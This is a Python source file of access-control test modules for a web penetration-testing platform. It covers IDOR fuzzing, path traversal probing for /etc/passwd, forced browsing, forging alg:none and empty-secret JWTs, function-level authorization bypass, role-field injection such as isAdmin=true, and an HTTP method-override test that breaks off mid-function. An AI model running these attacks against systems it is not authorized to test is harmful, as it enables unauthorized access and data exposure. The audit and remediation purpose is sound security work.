"""
Access Control attack modules — auto-discovered by ModuleRegistry.
Sprint 2 Phase 1: IDOR, Directory Traversal, Forced Browsing, JWT Priv Esc
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [AC-01] IDOR / BOLA ─────────────────────────────────────────────────────

class IDORModule(BaseModule):
    id = "AC-01"
    name = "IDOR / BOLA"
    category = "access_control"
    description = (
        "Fuzz object IDs in API endpoints to detect Insecure Direct Object "
        "References and Broken Object Level Authorization."
    )
    risk_level = "high"
    tags = ["idor", "bola", "ffuf", "authorization", "id-fuzzing"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="endpoint_template",
            label="Endpoint Template",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/users/FUZZ",
            help_text="Put FUZZ where the ID goes.",
        ),
        FieldSchema(
            key="id_type",
            label="ID Type",
            field_type="radio",
            default="sequential",
            options=[
                {"value": "sequential", "label": "Sequential integers"},
                {"value": "guid",       "label": "UUIDs (from wordlist)"},
                {"value": "wordlist",   "label": "Custom wordlist"},
            ],
        ),
        FieldSchema(
            key="id_range_start",
            label="Start ID",
            field_type="number",
            default=1,
            show_if={"id_type": "sequential"},
        ),
        FieldSchema(
            key="id_range_end",
            label="End ID",
            field_type="number",
            default=200,
            show_if={"id_type": "sequential"},
        ),
        FieldSchema(
            key="method",
            label="HTTP Method",
            field_type="select",
            default="GET",
            options=[
                {"value": "GET",    "label": "GET"},
                {"value": "POST",   "label": "POST"},
                {"value": "PUT",    "label": "PUT"},
                {"value": "DELETE", "label": "DELETE"},
            ],
        ),
        FieldSchema(
            key="auth_token",
            label="Authorization Token (victim account)",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="Bearer eyJ...",
        ),
        FieldSchema(
            key="attacker_token",
            label="Authorization Token (attacker account)",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="Bearer eyJ...",
            help_text="Provide to test cross-account access.",
        ),
        FieldSchema(
            key="filter_codes",
            label="Show only these HTTP codes",
            field_type="text",
            default="200,201,202,301,302",
            group="advanced",
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=40,
            min_value=1,
            max_value=100,
            step=5,
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import os
        import tempfile

        runner = ToolRunner("ffuf")
        endpoint = params["endpoint_template"]
        method = params.get("method", "GET")
        threads = str(int(params.get("threads", 40)))
        filter_codes = params.get("filter_codes", "200,201").replace(" ", "")
        output_file = runner.output_file_path(job_id, "json")

        # Build wordlist
        id_type = params.get("id_type", "sequential")
        wl_path = None

        if id_type == "sequential":
            start = int(params.get("id_range_start", 1))
            end = int(params.get("id_range_end", 200))
            # cap at 10000
            end = min(end, start + 10000)
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as wl:
                for i in range(start, end + 1):
                    wl.write(f"{i}\n")
                wl_path = wl.name
        elif id_type == "guid":
            wl_path = "/opt/tools/wordlists/uuids.txt"
            if not os.path.exists(wl_path):
                stream("warning", "UUID wordlist not found at /opt/tools/wordlists/uuids.txt — falling back to sequential 1-100")
                with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as wl:
                    for i in range(1, 101):
                        wl.write(f"{i}\n")
                wl_path = wl.name

        if not wl_path:
            return {"status": "failed", "findings": [], "raw_output": "No wordlist available."}

        args = [
            "-u", endpoint,
            "-w", wl_path,
            "-X", method,
            "-t", threads,
            "-o", str(output_file),
            "-of", "json",
            "-mc", filter_codes,
            "-c",
            "-silent",
        ]

        if params.get("attacker_token"):
            args += ["-H", f"Authorization: {params['attacker_token']}"]
        elif params.get("auth_token"):
            args += ["-H", f"Authorization: {params['auth_token']}"]

        stream("info", f"IDOR fuzzing: {endpoint} ({id_type})")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit)

        findings = []
        try:
            import json
            if os.path.exists(output_file):
                with open(output_file) as f:
                    data = json.load(f)
                for hit in data.get("results", []):
                    findings.append({
                        "title": f"Potential IDOR: {hit.get('url', '')} → HTTP {hit.get('status', '')}",
                        "severity": "high",
                        "url": hit.get("url", ""),
                        "description": (
                            f"Endpoint responded with HTTP {hit.get('status')} for ID '{hit.get('input', {}).get('FUZZ','')}'. "
                            "Verify if this data belongs to a different user."
                        ),
                        "evidence": f"Content-Length: {hit.get('length','')} Words: {hit.get('words','')}",
                        "remediation": (
                            "Implement server-side ownership checks on every object access. "
                            "Never rely on obscure IDs alone."
                        ),
                    })
        except Exception as e:
            stream("warning", f"Failed to parse ffuf output: {e}")

        # Cleanup temp wordlist
        if id_type == "sequential" and wl_path:
            try:
                os.unlink(wl_path)
            except Exception:
                pass

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
            "raw_output": result.get("stdout", ""),
        }


# ─── [AC-04] Directory Traversal ─────────────────────────────────────────────

class DirectoryTraversalModule(BaseModule):
    id = "AC-04"
    name = "Directory Traversal"
    category = "access_control"
    description = (
        "Fuzz path traversal sequences using ffuf to detect LFI/directory "
        "traversal vulnerabilities."
    )
    risk_level = "high"
    tags = ["lfi", "path-traversal", "ffuf", "dotdot", "file-inclusion"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/download?file=FUZZ",
            help_text="Put FUZZ at the injection point.",
        ),
        FieldSchema(
            key="wordlist_preset",
            label="Traversal Wordlist",
            field_type="select",
            default="lfi_linux",
            options=[
                {"value": "lfi_linux",   "label": "Linux LFI payloads"},
                {"value": "lfi_windows", "label": "Windows LFI payloads"},
                {"value": "traversal",   "label": "Path traversal sequences"},
            ],
        ),
        FieldSchema(
            key="custom_file",
            label="Custom Target File",
            field_type="text",
            required=False,
            placeholder="/etc/passwd",
            help_text="Append to traversal sequences as the target file.",
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
            group="advanced",
        ),
        FieldSchema(
            key="match_string",
            label="Match String in Response",
            field_type="text",
            required=False,
            default="root:",
            help_text="Positive indicator that traversal worked.",
            group="advanced",
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=30,
            min_value=1,
            max_value=80,
            step=5,
            group="advanced",
        ),
    ]

    _WORDLIST_MAP = {
        "lfi_linux":   "/opt/tools/wordlists/lfi/lfi-linux.txt",
        "lfi_windows": "/opt/tools/wordlists/lfi/lfi-windows.txt",
        "traversal":   "/opt/tools/wordlists/lfi/traversal.txt",
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import os
        runner = ToolRunner("ffuf")
        url = params["target_url"]
        threads = str(int(params.get("threads", 30)))
        match_str = params.get("match_string", "root:")
        wl_key = params.get("wordlist_preset", "lfi_linux")
        wordlist = self._WORDLIST_MAP.get(wl_key, "/opt/tools/wordlists/lfi/lfi-linux.txt")
        output_file = runner.output_file_path(job_id, "json")

        if not os.path.exists(wordlist):
            stream("warning", f"Wordlist not found: {wordlist}. Using seclists fallback.")
            wordlist = "/usr/share/seclists/Fuzzing/LFI/LFI-linux.txt"
        if not os.path.exists(wordlist):
            return {"status": "failed", "findings": [], "raw_output": "LFI wordlist not found."}

        args = [
            "-u", url,
            "-w", wordlist,
            "-t", threads,
            "-o", str(output_file),
            "-of", "json",
            "-ac",
        ]
        if match_str:
            args += ["-mr", match_str]
        if params.get("auth_cookie"):
            args += ["-H", f"Cookie: {params['auth_cookie']}"]

        stream("info", f"Running path traversal fuzz: {url}")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit)

        findings = []
        try:
            import json
            if os.path.exists(output_file):
                with open(output_file) as f:
                    data = json.load(f)
                for hit in data.get("results", []):
                    fuzz_val = hit.get("input", {}).get("FUZZ", "")
                    findings.append({
                        "title": f"Path Traversal: {fuzz_val}",
                        "severity": "high",
                        "url": hit.get("url", url),
                        "description": f"Traversal sequence '{fuzz_val}' matched expected file content pattern.",
                        "evidence": f"HTTP {hit.get('status','')} | Length: {hit.get('length','')}",
                        "remediation": (
                            "Canonicalize file paths server-side. "
                            "Use allowlists, not blocklists, for accessible file paths."
                        ),
                    })
        except Exception as e:
            stream("warning", f"Parse error: {e}")

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
            "raw_output": result.get("stdout", ""),
        }


# ─── [AC-05] Forced Browsing ─────────────────────────────────────────────────

class ForcedBrowsingModule(BaseModule):
    id = "AC-05"
    name = "Forced Browsing"
    category = "access_control"
    description = (
        "Discover hidden admin panels, backup files, and sensitive directories "
        "using ffuf with curated wordlists."
    )
    risk_level = "medium"
    tags = ["ffuf", "forced-browsing", "admin-panel", "directory-brute", "recon"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="base_url",
            label="Base URL",
            field_type="url",
            required=True,
            placeholder="https://example.com",
        ),
        FieldSchema(
            key="wordlist_preset",
            label="Wordlist",
            field_type="select",
            default="admin_paths",
            options=[
                {"value": "admin_paths",    "label": "Admin & control panels"},
                {"value": "common_dirs",    "label": "Common dirs (medium)"},
                {"value": "big_dirs",       "label": "Big list (slow)"},
                {"value": "sensitive_files","label": "Sensitive files (.env, .git, backup)"},
                {"value": "api_paths",      "label": "API endpoints"},
            ],
        ),
        FieldSchema(
            key="extensions",
            label="File Extensions",
            field_type="text",
            required=False,
            default="php,asp,aspx,jsp,html,txt,bak",
            help_text="Comma-separated. Leave empty to skip extension fuzzing.",
            group="advanced",
        ),
        FieldSchema(
            key="filter_codes",
            label="Filter HTTP codes (hide these)",
            field_type="text",
            default="404,400,403",
            group="advanced",
        ),
        FieldSchema(
            key="follow_redirects",
            label="Follow Redirects",
            field_type="toggle",
            default=True,
            group="advanced",
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            group="advanced",
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=50,
            min_value=1,
            max_value=200,
            step=10,
            group="advanced",
        ),
    ]

    _WORDLIST_MAP = {
        "admin_paths":     "/opt/tools/wordlists/dirs/admin-panels.txt",
        "common_dirs":     "/opt/tools/wordlists/dirs/common.txt",
        "big_dirs":        "/opt/tools/wordlists/dirs/big.txt",
        "sensitive_files": "/opt/tools/wordlists/dirs/sensitive-files.txt",
        "api_paths":       "/opt/tools/wordlists/dirs/api-endpoints.txt",
    }

    _SECLISTS_FALLBACK = {
        "admin_paths":     "/usr/share/seclists/Discovery/Web-Content/AdminPanels.txt",
        "common_dirs":     "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "big_dirs":        "/usr/share/seclists/Discovery/Web-Content/big.txt",
        "sensitive_files": "/usr/share/seclists/Discovery/Web-Content/Sensitive-Files.txt",
        "api_paths":       "/usr/share/seclists/Discovery/Web-Content/api/objects.txt",
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import os
        runner = ToolRunner("ffuf")
        base_url = params["base_url"].rstrip("/")
        threads = str(int(params.get("threads", 50)))
        filter_codes = params.get("filter_codes", "404,400").replace(" ", "")
        output_file = runner.output_file_path(job_id, "json")
        wl_key = params.get("wordlist_preset", "admin_paths")

        wordlist = self._WORDLIST_MAP.get(wl_key)
        if not wordlist or not os.path.exists(wordlist):
            wordlist = self._SECLISTS_FALLBACK.get(wl_key)
        if not wordlist or not os.path.exists(wordlist):
            return {"status": "failed", "findings": [], "raw_output": "Required wordlist not found."}

        fuzz_url = f"{base_url}/FUZZ"
        args = [
            "-u", fuzz_url,
            "-w", wordlist,
            "-t", threads,
            "-o", str(output_file),
            "-of", "json",
            "-fc", filter_codes,
            "-c",
        ]
        ext = params.get("extensions", "").strip()
        if ext:
            args += ["-e", f".{ext.replace(',',',.').replace(' ','')}"]
        if params.get("follow_redirects"):
            args.append("-r")
        if params.get("auth_cookie"):
            args += ["-H", f"Cookie: {params['auth_cookie']}"]

        stream("info", f"Forced browsing: {fuzz_url} [{wl_key}]")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit)

        findings = []
        try:
            import json
            if os.path.exists(output_file):
                with open(output_file) as f:
                    data = json.load(f)
                for hit in data.get("results", []):
                    status = hit.get("status", 0)
                    url = hit.get("url", "")
                    sev = "medium" if status == 200 else "info"
                    if "admin" in url.lower() or "dashboard" in url.lower():
                        sev = "high"
                    findings.append({
                        "title": f"Path discovered: {url}",
                        "severity": sev,
                        "url": url,
                        "description": f"HTTP {status} — path accessible without authentication.",
                        "evidence": f"Length: {hit.get('length','')} Words: {hit.get('words','')}",
                        "remediation": "Restrict access to admin paths. Implement proper auth checks.",
                    })
        except Exception as e:
            stream("warning", f"Parse error: {e}")

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
            "raw_output": result.get("stdout", ""),
        }


# ─── [AC-08] JWT Privilege Escalation ────────────────────────────────────────

class JWTPrivEscModule(BaseModule):
    id = "AC-08"
    name = "JWT Privilege Escalation"
    category = "access_control"
    description = (
        "Modify JWT claims (role, isAdmin, sub) and re-sign to test for "
        "privilege escalation vulnerabilities."
    )
    risk_level = "high"
    tags = ["jwt", "privilege-escalation", "token-manipulation", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="token",
            label="JWT Token",
            field_type="textarea",
            required=True,
            sensitive=True,
            placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        ),
        FieldSchema(
            key="target_url",
            label="Test Endpoint URL",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/admin/users",
        ),
        FieldSchema(
            key="claim_key",
            label="Claim to Modify",
            field_type="text",
            default="role",
            placeholder="role / isAdmin / privilege",
        ),
        FieldSchema(
            key="claim_value",
            label="New Claim Value",
            field_type="text",
            default="admin",
            placeholder="admin / true / superuser",
        ),
        FieldSchema(
            key="attacks",
            label="Attack Vectors",
            field_type="checkbox_group",
            default=["alg_none", "claim_tamper"],
            options=[
                {"value": "alg_none",     "label": "Algorithm: none (no signature)"},
                {"value": "claim_tamper", "label": "Tamper claim + re-sign (HS256 empty secret)"},
                {"value": "weak_secret",  "label": "Brute weak secret"},
            ],
        ),
        FieldSchema(
            key="weak_secret_list",
            label="Weak Secret Wordlist",
            field_type="wordlist_select",
            required=False,
            show_if={"attacks": "weak_secret"},
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import base64
        import json
        import urllib.request
        import urllib.error

        token = params["token"].strip()
        url = params["target_url"]
        claim_key = params.get("claim_key", "role")
        claim_value = params.get("claim_value", "admin")
        attacks = params.get("attacks", ["alg_none", "claim_tamper"])
        findings = []

        def b64pad(s):
            return s + "=" * (-len(s) % 4)

        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"status": "failed", "findings": [], "raw_output": "Invalid JWT format"}

            header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])).decode())
            payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])).decode())
        except Exception as e:
            return {"status": "failed", "findings": [], "raw_output": f"JWT decode error: {e}"}

        stream("info", f"JWT header: {json.dumps(header)}")
        stream("info", f"JWT payload claims: {list(payload.keys())}")

        def test_token(test_tok, label):
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Authorization": f"Bearer {test_tok}", "User-Agent": "PenTools/1.0"},
                )
                with urllib.request.urlopen(req, timeout=10) as resp:
                    status = resp.status
                    body = resp.read().decode("utf-8", errors="replace")[:500]
                    stream("info", f"{label} → HTTP {status}")
                    return status, body
            except urllib.error.HTTPError as e:
                stream("info", f"{label} → HTTP {e.code}")
                return e.code, ""
            except Exception as e:
                stream("warning", f"{label} → Error: {e}")
                return None, ""

        def make_token_alg_none(hdr, pay):
            hdr_mod = {**hdr, "alg": "none"}
            h = base64.urlsafe_b64encode(json.dumps(hdr_mod, separators=(",", ":")).encode()).rstrip(b"=").decode()
            p = base64.urlsafe_b64encode(json.dumps(pay, separators=(",", ":")).encode()).rstrip(b"=").decode()
            return f"{h}.{p}."  # empty signature

        def make_token_hs256(hdr, pay, secret=b""):
            import hmac as hmac_mod
            import hashlib
            hdr_b = base64.urlsafe_b64encode(json.dumps(hdr, separators=(",", ":")).encode()).rstrip(b"=").decode()
            pay_b = base64.urlsafe_b64encode(json.dumps(pay, separators=(",", ":")).encode()).rstrip(b"=").decode()
            signing_input = f"{hdr_b}.{pay_b}".encode()
            sig = hmac_mod.new(secret, signing_input, hashlib.sha256).digest()
            sig_b = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            return f"{hdr_b}.{pay_b}.{sig_b}"

        tampered_payload = {**payload, claim_key: claim_value}

        if "alg_none" in attacks:
            forged = make_token_alg_none(header, tampered_payload)
            status, body = test_token(forged, "alg:none")
            if status and status < 400:
                findings.append({
                    "title": "JWT Algorithm:none accepted — Signature bypass",
                    "severity": "critical",
                    "url": url,
                    "description": f"Server accepted JWT with alg:none and modified claim {claim_key}={claim_value}. Signature verification disabled.",
                    "evidence": f"HTTP {status} — forged token accepted.",
                    "remediation": "Explicitly reject 'none' algorithm in JWT validation. Enforce HS256/RS256.",
                })

        if "claim_tamper" in attacks:
            forged = make_token_hs256(header, tampered_payload, secret=b"")
            status, body = test_token(forged, "claim-tamper empty-secret")
            if status and status < 400:
                findings.append({
                    "title": "JWT accepted with empty secret — privilege escalation",
                    "severity": "critical",
                    "url": url,
                    "description": f"Server accepted tampered JWT (claim {claim_key}={claim_value}) signed with empty secret.",
                    "evidence": f"HTTP {status}",
                    "remediation": "Use strong, randomly-generated JWT secrets. Rotate if compromised.",
                })

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Tested JWT attack vectors: {attacks}",
        }


# ─── [AC-02] BFLA — Broken Function-Level Authorization ──────────────────────

class BFLAModule(BaseModule):
    id = "AC-02"
    name = "BFLA — Function-Level Auth Bypass"
    category = "access_control"
    description = (
        "Test whether low-privilege users can access admin/privileged API functions. "
        "Sends privileged requests using a low-privilege token and checks for 200/success responses."
    )
    risk_level = "high"
    tags = ["bfla", "broken-function-auth", "authorization", "privilege", "owasp-a01"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="admin_endpoints",
            label="Admin / Privileged Endpoints",
            field_type="textarea",
            required=True,
            placeholder="/api/admin/users\n/api/admin/settings\n/api/v1/users/all\n/api/v1/billing/reports",
            help_text="One endpoint path per line.",
        ),
        FieldSchema(
            key="base_url",
            label="Base URL",
            field_type="url",
            required=True,
            placeholder="https://api.example.com",
        ),
        FieldSchema(
            key="methods",
            label="HTTP Methods to Test",
            field_type="checkbox_group",
            default=["GET", "POST"],
            options=[
                {"value": "GET",    "label": "GET"},
                {"value": "POST",   "label": "POST"},
                {"value": "PUT",    "label": "PUT"},
                {"value": "DELETE", "label": "DELETE"},
                {"value": "PATCH",  "label": "PATCH"},
            ],
        ),
        FieldSchema(
            key="admin_token",
            label="Admin Token (for reference baseline)",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="Bearer eyJ... (admin JWT)",
            help_text="Optional — used to establish 200 baseline. Leave empty to skip.",
        ),
        FieldSchema(
            key="lowpriv_token",
            label="Low-Privilege Token",
            field_type="text",
            required=True,
            sensitive=True,
            placeholder="Bearer eyJ... (low-priv JWT)",
        ),
        FieldSchema(
            key="unauthenticated",
            label="Also test without any auth",
            field_type="toggle",
            default=True,
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        base = params["base_url"].rstrip("/")
        methods = params.get("methods", ["GET", "POST"])
        lowpriv = params["lowpriv_token"].strip()
        admin = (params.get("admin_token") or "").strip()
        also_unauth = params.get("unauthenticated", True)
        findings = []

        raw_endpoints = params.get("admin_endpoints", "")
        endpoints = [e.strip() for e in raw_endpoints.splitlines() if e.strip()]

        stream("info", f"Testing {len(endpoints)} endpoints × {len(methods)} methods for BFLA")

        for endpoint in endpoints:
            full_url = base + ("/" if not endpoint.startswith("/") else "") + endpoint.lstrip("/")

            # Baseline with admin token (if provided)
            admin_statuses: dict[str, int] = {}
            if admin:
                for m in methods:
                    try:
                        r = requests.request(m, full_url,
                                             headers={"Authorization": admin, "User-Agent": "PenTools/BFLA"},
                                             timeout=12, verify=verify)
                        admin_statuses[m] = r.status_code
                    except Exception:
                        admin_statuses[m] = -1

            # Test with low-priv token
            for m in methods:
                try:
                    r = requests.request(m, full_url,
                                         headers={"Authorization": lowpriv, "User-Agent": "PenTools/BFLA"},
                                         timeout=12, verify=verify)
                    stream("info", f"[lowpriv] {m} {endpoint}: HTTP {r.status_code}")

                    is_bfla = r.status_code in (200, 201) and (
                        admin_statuses.get(m, 200) in (200, 201)
                        or not admin  # no admin baseline — flag 200s
                    )

                    if is_bfla:
                        stream("success", f"BFLA: low-priv got HTTP {r.status_code} on {m} {endpoint}")
                        findings.append({
                            "title": f"BFLA — {m} {endpoint}",
                            "severity": "high",
                            "url": full_url,
                            "description": (
                                f"Low-privilege token accessed admin/privileged endpoint {m} {endpoint} "
                                f"with HTTP {r.status_code}. This indicates Broken Function Level Authorization."
                            ),
                            "evidence": f"Method: {m}\nEndpoint: {full_url}\nHTTP {r.status_code}\nResponse: {r.text[:300]}",
                            "remediation": (
                                "Enforce role-based access control on every function/endpoint server-side. "
                                "Never rely on client-supplied role information. "
                                "Check authorization on every request — not just at login."
                            ),
                            "cwe_id": "CWE-285",
                        })
                except Exception as e:
                    stream("warning", f"Request failed ({m} {endpoint}): {e}")

            # Unauthenticated test
            if also_unauth:
                for m in ["GET", "POST"]:
                    try:
                        r = requests.request(m, full_url,
                                             headers={"User-Agent": "PenTools/BFLA"},
                                             timeout=12, verify=verify)
                        if r.status_code in (200, 201):
                            stream("success", f"BFLA: Unauthenticated {m} {endpoint} → HTTP {r.status_code}")
                            findings.append({
                                "title": f"BFLA — Unauthenticated Access: {m} {endpoint}",
                                "severity": "critical",
                                "url": full_url,
                                "description": f"Privileged endpoint {m} {endpoint} accessible without authentication.",
                                "evidence": f"HTTP {r.status_code}\n{r.text[:300]}",
                                "remediation": "Require authentication + authorization on all admin endpoints.",
                                "cwe_id": "CWE-285",
                            })
                    except Exception:
                        pass

        stream("info", f"BFLA scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [AC-03] Privilege Escalation ─────────────────────────────────────────────

class PrivilegeEscalationModule(BaseModule):
    id = "AC-03"
    name = "Privilege Escalation"
    category = "access_control"
    description = (
        "Tamper with role/privilege parameters in requests to escalate from "
        "low-privilege to admin. Tests role parameter injection in request body, "
        "query string, and headers."
    )
    risk_level = "high"
    tags = ["privilege-escalation", "role-tamper", "isadmin", "authorization", "owasp-a01"]
    celery_queue = "web_audit_queue"
    time_limit = 240

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target Endpoint",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/users/profile",
            help_text="An endpoint that reads or stores user role/privilege info.",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="PUT",
            options=[
                {"value": "POST",  "label": "POST"},
                {"value": "PUT",   "label": "PUT"},
                {"value": "PATCH", "label": "PATCH"},
                {"value": "GET",   "label": "GET"},
            ],
        ),
        FieldSchema(
            key="content_type",
            label="Content Type",
            field_type="select",
            default="json",
            options=[
                {"value": "json", "label": "application/json"},
                {"value": "form", "label": "application/x-www-form-urlencoded"},
            ],
        ),
        FieldSchema(
            key="base_body",
            label="Base Request Body (JSON or form)",
            field_type="json_editor",
            required=False,
            placeholder='{"name": "John", "email": "john@example.com"}',
        ),
        FieldSchema(
            key="role_fields_to_inject",
            label="Role Fields to Inject",
            field_type="textarea",
            default='role=admin\nisAdmin=true\nis_admin=1\nuser_type=admin\naccountType=premium',
            help_text="One field=value per line. Will be injected alongside the base body.",
        ),
        FieldSchema(
            key="auth_token",
            label="Auth Token (low-privilege)",
            field_type="text",
            required=True,
            sensitive=True,
            placeholder="Bearer eyJ...",
        ),
        FieldSchema(
            key="verify_response_for",
            label="Success Indicator Keywords",
            field_type="text",
            default="admin,true,success,updated,privilege",
            help_text="Comma-separated keywords that indicate the tamper succeeded.",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import json as json_lib

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "PUT")
        ct = params.get("content_type", "json")
        auth_token = params["auth_token"].strip()
        success_kw = [k.strip().lower() for k in params.get("verify_response_for", "admin,true").split(",")]
        findings = []

        headers = {
            "Authorization": auth_token,
            "User-Agent": "PenTools/PrivEsc",
        }

        # Parse base body
        base_body: dict = {}
        raw_base = params.get("base_body", "").strip()
        if raw_base:
            try:
                base_body = json_lib.loads(raw_base)
            except Exception:
                for line in raw_base.splitlines():
                    if "=" in line:
                        k, _, v = line.partition("=")
                        base_body[k.strip()] = v.strip()

        # Parse injection fields
        inject_lines = params.get("role_fields_to_inject", "role=admin\nisAdmin=true")
        inject_combos: list[dict] = []
        for line in inject_lines.splitlines():
            line = line.strip()
            if "=" in line:
                k, _, v = line.partition("=")
                # Try to coerce type
                val: object = v.strip()
                if val.lower() == "true":
                    val = True
                elif val.lower() == "false":
                    val = False
                elif val.isdigit():
                    val = int(val)
                inject_combos.append({k.strip(): val})

        stream("info", f"Testing {len(inject_combos)} privilege escalation field injections")

        for inject in inject_combos:
            merged = {**base_body, **inject}
            label = ", ".join(f"{k}={v}" for k, v in inject.items())
            try:
                req_headers = {**headers}
                if ct == "json":
                    req_headers["Content-Type"] = "application/json"
                    resp = requests.request(method, url, json=merged, headers=req_headers,
                                            timeout=12, verify=verify)
                else:
                    resp = requests.request(method, url, data={k: str(v) for k, v in merged.items()},
                                            headers=req_headers, timeout=12, verify=verify)

                stream("info", f"PrivEsc [{label}]: HTTP {resp.status_code}")
                body_lower = resp.text.lower()

                if resp.status_code in (200, 201) and any(k in body_lower for k in success_kw):
                    stream("success", f"Privilege escalation potential: {label}")
                    findings.append({
                        "title": f"Privilege Escalation — {label}",
                        "severity": "high",
                        "url": url,
                        "description": (
                            f"Injecting '{label}' into the request body returned a response "
                            f"consistent with privilege elevation (HTTP {resp.status_code}, success keywords found)."
                        ),
                        "evidence": f"Injected: {inject}\nHTTP {resp.status_code}\nResponse: {resp.text[:400]}",
                        "remediation": (
                            "Never read role or privilege fields from client-supplied request bodies. "
                            "Derive user roles exclusively from server-side session/token data."
                        ),
                        "cwe_id": "CWE-269",
                    })
            except Exception as e:
                stream("warning", f"Request failed ({label}): {e}")

        stream("info", f"Privilege escalation scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [AC-06] HTTP Method Override ─────────────────────────────────────────────

class HTTPMethodOverrideModule(BaseModule):
    id = "AC-06"
    name = "HTTP Method Override"
    category = "access_control"
    description = (
        "Test X-HTTP-Method-Override and similar headers to bypass HTTP method "
        "restrictions — enabling DELETE/PUT on endpoints that block those verbs."
    )
    risk_level = "medium"
    tags = ["method-override", "x-http-method-override", "verb-tamper", "access-control"]
    celery_queue = "web_audit_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target Endpoint",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/users/123",
        ),
        FieldSchema(
            key="override_methods",
            label="Methods to Override To",
            field_type="checkbox_group",
            default=["DELETE", "PUT", "PATCH"],
            options=[
                {"value": "DELETE", "label": "DELETE"},
                {"value": "PUT",    "label": "PUT"},
                {"value": "PATCH",  "label": "PATCH"},
                {"value": "HEAD",   "label": "HEAD"},
                {"value": "TRACE",  "label": "TRACE"},
            ],
        ),
        FieldSchema(
            key="override_headers",
            label="Override Header Names to Test",
            field_type="checkbox_group",
            default=["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"],
            options=[
                {"value": "X-HTTP-Method-Override", "label": "X-HTTP-Method-Override"},
                {"value": "X-Method-Override",      "label": "X-Method-Override"},
                {"value": "X-HTTP-Method",          "label": "X-HTTP-Method"},
                {"value": "_method",                "label": "_method (form field)"},
            ],
        ),
        FieldSchema(
            key="base_method",
            label="Sending Method (transport)",
            field_type="select",
            default="POST",
            options=[{"value": "POST", "label": "POST"}, {"value": "GET", "label": "GET"}],
        ),
        FieldSchema(
            key="body",
            label="Request Body (JSON, optional)",
            field_type="json_editor",
            required=False,
            placeholder='{"key": "value"}',
        ),
        FieldSchema(
            key="auth_token",
            label="Auth Token",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="Bearer eyJ...",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import json as json_lib

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        base_method = params.get("base_method", "POST")
        target_methods = params.get("override_methods", ["DELETE", "PUT"])
        override_headers = params.get("override_headers", ["X-HTTP-Method-Override"])
        findings = []

        req_headers: dict[str, str] = {"User-Agent": "PenTools/MethodOverride"}
        if params.get("auth_token"):
            req_headers["Authorization"] = params["auth_token"].strip()

        body = None
        raw_body = params.get("body", "").strip()
        if raw_body:
            try:
                body = json_lib.loads(raw_body)
                req_headers["Content-Type"] = "application/json"
            except Exception:
                pass

